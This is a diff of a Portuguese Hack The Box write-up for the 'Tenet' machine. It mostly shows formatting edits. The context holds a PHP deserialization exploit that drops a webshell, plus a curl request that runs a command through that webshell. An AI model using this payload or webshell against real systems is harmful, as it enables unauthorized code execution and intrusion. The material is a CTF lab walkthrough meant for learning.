@@ -19,12 +19,14 @@ Olá pessoal!
 
 A máquina desta semana será **Tenet**, outra máquina Linux classificada como mediana do [Hack The Box](https://www.hackthebox.eu/), criada por [egotisticalSW](https://app.hackthebox.eu/users/94858).
 
-\:information\_source: **Info**: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas.
-\[info]
+<Alert kind="info" title="Info">
+  Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são
+  aposentadas.
+</Alert>
 
 ![HTB Tenet](https://i.imgur.com/vouXrOD.png)
 
-Antes de iniciar a resolução desta máquina, me chamou atenção a ilustração, a qual busquei e acabei encontrando sobre o quadrado Sator, onde temos um palíndromo com cinco palavras latinas: *SATOR*, *AREPO*, *TENET*, *OPERA* e *ROTAS*, que em um conjunto formam um quadrado com as mesmas palavras sendo TENET a central. Muito possivelmente estas palavras poderão estar presentes em algum ponto da resolução desta máquina \:smile:.
+Antes de iniciar a resolução desta máquina, me chamou atenção a ilustração, a qual busquei e acabei encontrando sobre o quadrado Sator, onde temos um palíndromo com cinco palavras latinas: _SATOR_, _AREPO_, _TENET_, _OPERA_ e _ROTAS_, que em um conjunto formam um quadrado com as mesmas palavras sendo TENET a central. Muito possivelmente estas palavras poderão estar presentes em algum ponto da resolução desta máquina \:smile:.
 
 ## Enumeração
 
@@ -93,8 +95,8 @@ Como ao acessar a página pela url `http://10.10.10.223/wordpress` informa uma m
 Analisando as postagens ao acessar o wordpress pelo DNS, notei que os posts mencionam um sistema chamado **Rotas**, que possivelmente possa conter algum item a ser explorado e conseguir um acesso inicial
 
 > This Is Where Our Worlds Collide
-> We’re looking for beta testers of our new time-management software, ‘Rotas’
-> ‘Rotas’ will hopefully be coming to market late 2021, pending rigorous QA from our developers, and you! For more information regarding opting-in, watch this space.
+> We're looking for beta testers of our new time-management software, 'Rotas'
+> 'Rotas' will hopefully be coming to market late 2021, pending rigorous QA from our developers, and you! For more information regarding opting-in, watch this space.
 
 As coisas ficam mais interessantes em um post mais antigo, onde o usuário `neil` comenta o seguinte na postagem:
 
@@ -113,13 +115,13 @@ class DatabaseExport
 {
     public $user_file = 'users.txt';
     public $data = '';
-    
+
     public function update_db()
     {
         echo '[+] Grabbing users from text file <br>';
         $this-> data = 'Success';
     }
-    
+
     public function __destruct()
     {
         file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
@@ -144,19 +146,19 @@ Como podemos ver este código é vulnerável a **PHP Deserialization**, uma vez 
 Para acesso inicial o primeiro passo é criar um dado serializado do PHP malicioso e enviar no argumento **arepo** conforme vimos no metodo get. Buscando um pouco encontrei [este exemplo de exploit](https://github.com/1N3/Exploits/blob/master/PHP-Serialization-RCE-Exploit.php) que foi modificado para gerar um webshell simples na máquina, o qual poderia a posteriori ser utilizado para obter um shell reverso na máquina.
 
 ```php
-<?php 
+<?php
 
 class DatabaseExport
 {
     public $user_file = 'shell.php';
     public $data = '<?php system($_GET["cmd"]); ?>';
-    
+
     public function update_db()
     {
         echo '[+] Grabbing users from text file <br>';
         $this-> data = 'Success';
     }
-    
+
     public function __destruct()
     {
         file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
@@ -176,7 +178,7 @@ Após execução, foi possível validar o funcionamento do webshell com a chamad
 ```bash
 $ php exploit.php
 [] Database updated <br>[+] Grabbing users from text file <br>
-[] Database updated <br>[] Database updated <br>   
+[] Database updated <br>[] Database updated <br>
 
 $ curl -L http://10.10.10.223/shell.php?cmd=id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -237,7 +239,7 @@ Adicionalmente, buscando por possiveis privilégios de sudo do usuário neil (`s
 ```plaintext
 Matching Defaults entries for www-data on tenet:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:
-    
+
 User www-data may run the following commands on tenet:
     (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
 ```
